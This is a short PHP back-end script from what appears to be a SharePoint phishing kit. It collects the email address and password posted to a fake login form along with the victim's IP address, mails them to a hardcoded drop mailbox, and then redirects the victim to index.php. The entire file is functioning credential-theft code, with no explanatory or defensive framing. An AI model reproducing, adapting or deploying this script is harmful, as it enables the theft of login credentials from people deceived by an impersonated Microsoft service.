<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------sharepoint results-----------------------\n";
$message .= "E-mail:           : ".$_POST['email']."\n";
$message .= "Pass:            : ".$_POST['password']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------sharepoint results-------------\n";
$send = "candace6686@hotmail.com";
$subject = "Result from Unknown";
$headers = "From: share<customer-support@mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}




	
		   header("Location: index.php");

	 
?>